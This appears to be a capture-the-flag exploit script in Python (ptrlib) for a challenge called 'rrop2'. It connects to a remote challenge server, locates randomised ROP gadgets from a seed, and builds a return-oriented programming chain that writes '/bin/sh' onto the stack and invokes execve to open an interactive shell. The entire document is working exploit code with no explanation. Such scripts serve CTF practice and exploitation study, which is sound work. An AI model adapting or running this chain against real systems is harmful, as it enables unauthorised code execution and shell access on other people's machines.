from ptrlib import *
import time
import os

while True:
    #sock = Process("./chall")
    sock = Socket("rrop2-01.pwn.beer", 45243)
    sock.recvuntil("seed: ")
    seed = int(sock.recvline())
    sock.recvuntil("addr: ")
    rop_base = int(sock.recvline(), 16)
    logger.info("rop base = " + hex(rop_base))
    os.system("./a.out {}".format(seed))
    time.sleep(0.1)
    gadgets = open("gadgets", "rb").read()
    try:
        rop_pop_rax = rop_base + gadgets.index(b'\x58\xc3')
        rop_pop_rdi = rop_base + gadgets.index(b'\x5f\xc3')
        rop_ret = rop_base + gadgets.index(b'\xc3')
        rop_mov_rdi_rsp = rop_base + gadgets.index(b'\x54\x5f\xc3')
        rop_syscall = rop_base + gadgets.index(b'\x0f\x05')
        rop_std = rop_base + gadgets.index(b'\xfd\xc3')
        rop_cld = rop_base + gadgets.index(b'\xfc\xc3')
    except:
        sock.close()
        time.sleep(0.9)
        continue
    if b'\xab\xc3' in gadgets:
        bs = 4
        rop_stos = rop_base + gadgets.index(b'\xab\xc3')
    elif b'\xaa\xc3' in gadgets:
        bs = 1
        rop_stos = rop_base + gadgets.index(b'\xaa\xc3')
    else:
        logger.warn("Bad luck")
        continue

    logger.info("break at *" + hex(rop_syscall))

    def mov_rdi_rsp():
        payload  = p64(rop_ret) * 8
        payload += p64(rop_mov_rdi_rsp)
        return payload

    def write_to_stack(val):
        payload  = p64(rop_pop_rax)
        payload += p64(val)
        payload += p64(rop_std)
        payload += p64(rop_stos)
        return payload

    payload = b''
    payload += mov_rdi_rsp()

    string = b'/bin/sh\x00'
    for i in range(0, len(string), bs):
        payload += write_to_stack(u32(string[len(string) - i - bs:len(string) - i]))
    payload += p64(rop_cld)
    payload += p64(rop_stos)
    payload += p64(rop_pop_rax)
    payload += p64(59)
    payload += p64(rop_syscall)
    payload += p64(0xffffffffffffffff)
    sock.sendafter("rrop: ", payload)

    sock.interactive()
